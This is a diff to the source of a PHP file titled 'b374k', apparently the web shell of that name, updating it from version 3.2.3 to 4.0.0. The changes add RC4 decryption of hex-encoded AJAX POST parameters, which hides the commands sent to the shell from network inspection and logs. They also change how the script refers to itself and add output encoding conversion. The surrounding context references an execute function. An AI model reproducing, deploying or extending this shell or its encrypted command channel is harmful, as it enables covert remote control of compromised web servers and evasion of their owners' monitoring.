@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.2.3";
+$GLOBALS['ver'] = "4.0.0";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -63,13 +63,25 @@ if(!function_exists('get_server_info')){
 if(!function_exists('get_self')){
 	function get_self(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
-		return html_safe($_SERVER["REQUEST_URI"].$query);
+		return html_safe($_SERVER["SCRIPT_NAME"].$query);
+	}
+}
+
+if(!function_exists('is_ajax')) {
+	function is_ajax() {
+		return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
 	}
 }
 
 if(!function_exists('get_post')){
 	function get_post(){
-		return fix_magic_quote($_POST);
+		$post = fix_magic_quote($_POST);
+		if(empty($_FILES) && is_ajax()) {
+			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['target']));
+			parse_str($post_str, $post);
+			$post = fix_magic_quote($post);
+		}	
+		return $post;
 	}
 }
 
@@ -207,7 +219,7 @@ if(!function_exists('execute')){
 
 if(!function_exists('html_safe')){
 	function html_safe($str){
-		return htmlspecialchars($str, 2 | 1);
+		return htmlspecialchars($str, 2 | 1, 'ISO-8859-1');
 	}
 }
 
@@ -981,8 +993,60 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		echo $str;
+		echo (isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8') ? convert_encode($GLOBALS['encode'], 'utf-8', $str) : $str;
 		die();
+	}
+}
+
+if(!function_exists('convert_encode')) {
+	function convert_encode($from, $to, $txt)
+	{
+		$ret = false;
+		if(function_exists("iconv")) {
+			$ret = @iconv($from, $to, $txt);
+		} elseif(function_exists('mb_convert_encoding')) {
+			$ret = @mb_convert_encoding($txt, $to, $from);
+		}
+		return $ret === false ? $txt : $ret;
+	}
+}
+
+if ( !function_exists( 'hex2bin' ) ) {
+    function hex2bin( $str ) {
+        $sbin = "";
+        $len = strlen( $str );
+        for ( $i = 0; $i < $len; $i += 2 ) {
+            $sbin .= pack( "H*", substr( $str, $i, 2 ) );
+        }
+        return $sbin;
+    }
+}
+
+if(!function_exists('rc4')) {
+	function rc4($key, $str) {
+		$s = array();
+		for ($i = 0; $i < 256; $i++) {
+			$s[$i] = $i;
+		}
+		$j = 0;
+		for ($i = 0; $i < 256; $i++) {
+			$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
+			$x = $s[$i];
+			$s[$i] = $s[$j];
+			$s[$j] = $x;
+		}
+		$i = 0;
+		$j = 0;
+		$res = '';
+		for ($y = 0; $y < strlen($str); $y++) {
+			$i = ($i + 1) % 256;
+			$j = ($j + $s[$i]) % 256;
+			$x = $s[$i];
+			$s[$i] = $s[$j];
+			$s[$j] = $x;
+			$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
+		}
+		return $res;
 	}
 }
 ?>
